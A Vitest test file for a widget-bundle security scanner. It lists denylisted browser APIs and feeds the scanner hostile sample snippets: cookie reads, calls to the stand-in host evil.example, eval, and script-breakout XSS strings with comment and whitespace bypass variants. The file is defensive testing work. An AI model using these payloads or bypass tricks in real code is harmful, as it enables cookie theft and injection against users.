import fs from "node:fs"
import path from "node:path"
import { describe, it, expect } from "vitest"
import { scanBundle, MAX_BUNDLE_BYTES } from "../scan"

// A realistic minimal widget: talks to the host only through the SDK.
const VALID_WIDGET = `
host.onInit(async function () {
  var root = document.getElementById("app")
  var res = await host.request("getDictionary")
  root.textContent = String((res.entries || []).length) + " entries"
  host.reportHeight()
})
host.ready()
`

/** Embed a snippet in otherwise valid widget code so rules must match mid-bundle. */
function embed(snippet: string): string {
  return `host.ready()\n${snippet}\nhost.reportHeight()`
}

type RuleCase = {
  rule: string
  snippet: string
  /** Fragment of the rejection reason that identifies the rule that fired. */
  reason: string
}

// One entry per DENYLIST rule in scan.ts (DENYLIST is not exported). Each
// snippet trips exactly one rule, and we assert WHICH rule fired, so deleting
// any single rule either flips the result to ok or changes the reason.
const RULE_CASES: RuleCase[] = [
  { rule: "document.cookie", snippet: "var c = document.cookie", reason: "document.cookie" },
  { rule: "localStorage", snippet: 'localStorage.setItem("k", "v")', reason: "Web Storage" },
  { rule: "sessionStorage", snippet: 'sessionStorage.getItem("k")', reason: "Web Storage" },
  { rule: "indexedDB", snippet: 'indexedDB.open("db")', reason: "indexedDB" },
  { rule: "XMLHttpRequest", snippet: "var x = new XMLHttpRequest()", reason: "XMLHttpRequest" },
  { rule: "WebSocket", snippet: 'new WebSocket("wss://evil.example")', reason: "WebSocket" },
  { rule: "EventSource", snippet: 'new EventSource("/stream")', reason: "EventSource" },
  { rule: "navigator.sendBeacon", snippet: 'navigator.sendBeacon("/log", data)', reason: "sendBeacon" },
  { rule: "fetch(", snippet: 'fetch("/api/secret")', reason: "fetch" },
  { rule: "eval(", snippet: 'eval("1 + 1")', reason: "eval" },
  { rule: "new Function", snippet: 'new Function("return 1")', reason: "Function constructor" },
  { rule: "import(", snippet: 'import("https://evil.example/x.js")', reason: "Dynamic import" },
  { rule: "importScripts", snippet: 'importScripts("x.js")', reason: "importScripts" },
  { rule: "document.domain", snippet: 'document.domain = "example.com"', reason: "document.domain" },
  { rule: "window.top", snippet: 'window.top.location = "https://evil.example"', reason: "window.top" },
  { rule: "window.opener", snippet: 'window.opener.postMessage("x", "*")', reason: "window.opener" },
  { rule: "</script>", snippet: "</script><script>alert(1)", reason: "</script>" },
]

// Whitespace / casing variants the regexes explicitly tolerate (\s*, \s+, /i).
const WHITESPACE_CASES: RuleCase[] = [
  { rule: "document . cookie", snippet: "document . cookie", reason: "document.cookie" },
  { rule: "document<newlines>cookie", snippet: "document\n.\ncookie", reason: "document.cookie" },
  { rule: "fetch (", snippet: 'fetch ("/x")', reason: "fetch" },
  { rule: "fetch<newline>(", snippet: 'fetch\n("/x")', reason: "fetch" },
  { rule: "eval<tab>(", snippet: 'eval\t("1")', reason: "eval" },
  { rule: "import (", snippet: 'import ("x")', reason: "Dynamic import" },
  { rule: "navigator . sendBeacon", snippet: 'navigator . sendBeacon("/x")', reason: "sendBeacon" },
  { rule: "window . top", snippet: "window . top.location", reason: "window.top" },
  { rule: "window<newlines>opener", snippet: "window\n.\nopener", reason: "window.opener" },
  { rule: "document . domain", snippet: 'document . domain = "x"', reason: "document.domain" },
  { rule: "new<spaces>Function", snippet: 'new   Function("x")', reason: "Function constructor" },
  { rule: "new<newline>Function", snippet: 'new\nFunction("x")', reason: "Function constructor" },
  { rule: "</script >", snippet: "</script >", reason: "</script>" },
  { rule: "</script<newline>>", snippet: "</script\n>", reason: "</script>" },
  { rule: "</SCRIPT>", snippet: "</SCRIPT>", reason: "</script>" },
  { rule: "</ScRiPt>", snippet: "</ScRiPt>", reason: "</script>" },
]

function expectRejectedFor(code: string, reason: string) {
  expect(scanBundle(code)).toEqual({ ok: false, reason: expect.stringContaining(reason) })
}

describe("scanBundle", () => {
  describe("accepted bundles", () => {
    it("accepts a valid minimal widget", () => {
      expect(scanBundle(VALID_WIDGET)).toEqual({ ok: true })
    })

    it("accepts widget code that only talks to the host SDK", () => {
      const code = `
        var res = await host.request("getPhonology")
        var t = setTimeout(function () { host.reportHeight() }, 10)
        host.download("words.csv", "text/csv", "a,b")
      `
      expect(scanBundle(code)).toEqual({ ok: true })
    })

    it("does not flag identifiers that merely contain a denied word", () => {
      const code = `
        prefetch("x")
        evaluate(expr)
        var localStorageKey = "k"
        var myWebSocketHelper = null
        window.topology = 1
      `
      expect(scanBundle(code)).toEqual({ ok: true })
    })

    it("accepts prose that mentions fetch without calling it", () => {
      expect(scanBundle('root.textContent = "Please fetch the dictionary first"')).toEqual({ ok: true })
    })
  })

  describe("empty and invalid input", () => {
    it.each([
      ["empty string", ""],
      ["spaces only", "    "],
      ["newlines and tabs only", "\n\t \r\n"],
    ])("rejects an empty bundle (%s)", (_label, code) => {
      expect(scanBundle(code)).toEqual({ ok: false, reason: "Bundle code is empty" })
    })

    it.each([
      ["undefined", undefined],
      ["null", null],
      ["a number", 42],
      ["an object", { code: "host.ready()" }],
      ["an array of strings", ["host.ready()"]],
    ])("rejects non-string input (%s) instead of throwing", (_label, value) => {
      expect(scanBundle(value as unknown as string)).toEqual({
        ok: false,
        reason: "Bundle code is empty",
      })
    })
  })

  describe("size limit", () => {
    it("accepts a bundle of exactly MAX_BUNDLE_BYTES", () => {
      expect(scanBundle("a".repeat(MAX_BUNDLE_BYTES))).toEqual({ ok: true })
    })

    it("rejects a bundle one byte over MAX_BUNDLE_BYTES", () => {
      expectRejectedFor("a".repeat(MAX_BUNDLE_BYTES + 1), "exceeds")
    })

    it("measures bytes, not characters (multi-byte text cannot sneak past the limit)", () => {
      // "é" is 2 bytes in UTF-8, so this is under the limit by char count but over by bytes.
      const overByBytes = "é".repeat(MAX_BUNDLE_BYTES / 2 + 1)
      expect(overByBytes.length).toBeLessThan(MAX_BUNDLE_BYTES)
      expectRejectedFor(overByBytes, "exceeds")

      const exactlyAtLimit = "é".repeat(MAX_BUNDLE_BYTES / 2)
      expect(scanBundle(exactlyAtLimit)).toEqual({ ok: true })
    })

    it("counts 4-byte emoji by their encoded size", () => {
      const emoji = "😀".repeat(MAX_BUNDLE_BYTES / 4 + 1)
      expectRejectedFor(emoji, "exceeds")
    })
  })

  describe("denylist rules", () => {
    it.each(RULE_CASES)("rejects $rule", ({ snippet, reason }) => {
      expectRejectedFor(embed(snippet), reason)
    })

    it.each(RULE_CASES)("rejects $rule even when it is the whole bundle", ({ snippet, reason }) => {
      expectRejectedFor(snippet, reason)
    })

    it("still catches a denied pattern at the very end of a near-limit bundle", () => {
      const filler = "var pad = 1;\n"
      const body = filler.repeat(Math.floor((MAX_BUNDLE_BYTES - 100) / filler.length))
      const code = body + 'document.cookie = "x"'
      expect(new TextEncoder().encode(code).length).toBeLessThanOrEqual(MAX_BUNDLE_BYTES)
      expectRejectedFor(code, "document.cookie")
    })

    it("has a test case for every rule in scan.ts", () => {
      // DENYLIST is module-private, so count the rule literals in the source.
      // Adding a rule without adding a RULE_CASES entry fails here.
      const source = fs.readFileSync(path.join(process.cwd(), "lib/modules/scan.ts"), "utf-8")
      const ruleCount = (source.match(/pattern:\s*\//g) ?? []).length
      const coveredRules = new Set(RULE_CASES.map((c) => c.reason))
      expect(ruleCount).toBeGreaterThan(0)
      expect(coveredRules.size).toBe(ruleCount)
    })
  })

  describe("whitespace and casing variants", () => {
    it.each(WHITESPACE_CASES)("rejects $rule", ({ snippet, reason }) => {
      expectRejectedFor(embed(snippet), reason)
    })
  })

  describe("bypasses that used to pass", () => {
    it.each([
      // HTML ends a script element at "</script" + "/" or whitespace, not only "</script>".
      { snippet: "var s = '</script/><img src=x onerror=alert(1)>'", reason: "Closing </script>" },
      { snippet: "var s = '</script x>'", reason: "Closing </script>" },
      { snippet: 'Function("return 1")()', reason: "Function constructor" },
      { snippet: 'fetch/**/("/x")', reason: "Direct fetch" },
      { snippet: "var c = document/* x */.cookie", reason: "document.cookie" },
      { snippet: 'import//\n("x")', reason: "Dynamic import" },
    ])("rejects $snippet", ({ snippet, reason }) => {
      expectRejectedFor(embed(snippet), reason)
    })

    it("can't be hidden behind a // inside a string", () => {
      expectRejectedFor(embed('var u = "http://x"; fetch(u)'), "Direct fetch")
    })

    it("still accepts ordinary code with URLs and comments", () => {
      const code = embed('// docs: https://example.com/guide\nvar link = "https://example.com" /* shown */')
      expect(scanBundle(code)).toEqual({ ok: true })
      expect(scanBundle(embed("function isFunction(x) { return typeof x === 'function' }"))).toEqual({ ok: true })
    })
  })
})
